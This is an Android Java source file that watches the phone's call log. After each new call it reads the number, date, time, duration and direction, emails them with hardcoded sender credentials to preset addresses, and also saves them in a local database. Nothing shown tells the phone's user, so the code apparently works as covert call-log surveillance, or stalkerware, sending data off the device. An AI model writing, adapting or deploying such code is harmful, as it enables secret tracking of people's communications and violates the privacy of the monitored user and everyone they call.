package com.deepscan;


import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class History extends ContentObserver {

    Context c;


    public History(Handler handler, Context cc) {
        // TODO Auto-generated constructor stub
        super(handler);
        c=cc;

    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    @Override
    public void onChange(boolean selfChange) {
        // TODO Auto-generated method stub
        super.onChange(selfChange);
        SharedPreferences sp=c.getSharedPreferences("Addicted", Activity.MODE_PRIVATE);
        String number=sp.getString("number", null);
        if(number!=null)
        {
            getCalldetailsNow();
            sp.edit().putString("number", null).commit();
        }
    }

    private void getCalldetailsNow() {
        // TODO Auto-generated method stub

        Cursor managedCursor=c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");

        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int duration1 = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
        int type1=managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date1=managedCursor.getColumnIndex(CallLog.Calls.DATE);

        if( managedCursor.moveToFirst() == true ) {
            String phNumber = managedCursor.getString(number);
            String callDuration = managedCursor.getString(duration1);

            String type=managedCursor.getString(type1);
            String date=managedCursor.getString(date1);

            String dir = null;
            int dircode = Integer.parseInt(type);
            switch (dircode)
            {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
                default:
                    dir = "MISSED";
                    break;
            }

            SimpleDateFormat sdf_date = new SimpleDateFormat("dd/MM/yyyy");
            SimpleDateFormat sdf_time = new SimpleDateFormat("h:mm a");
            // SimpleDateFormat sdf_dur = new SimpleDateFormat("KK:mm:ss");
            sdf_date.setTimeZone(TimeZone.getTimeZone("IST"));

            String dateString = sdf_date.format(new Date(Long.parseLong(date)));
            String timeString = sdf_time.format(new Date(Long.parseLong(date)));
            //  String duration_new=sdf_dur.format(new Date(Long.parseLong(callDuration)));


            String body="Number:"+phNumber+"\nDate:"+dateString+"\nTime:"+timeString+"\nDuration:"+callDuration+"\nCall Type:"+dir+"\n\n";
            List<String> toEmailList = Arrays.asList(Constant.TO_EMAIL_CALL
                    .split("\\s*,\\s*"));


           new SendMailTask(c).execute(Constant.EMAIL,
                  Constant.PASSWORD, toEmailList, "call details", body,false);

            DBHelper db=new DBHelper(c, "Addicted.db", null, 2);
            db.insertdata(phNumber, dateString, timeString, callDuration, dir);





        }

        managedCursor.close();
    }

}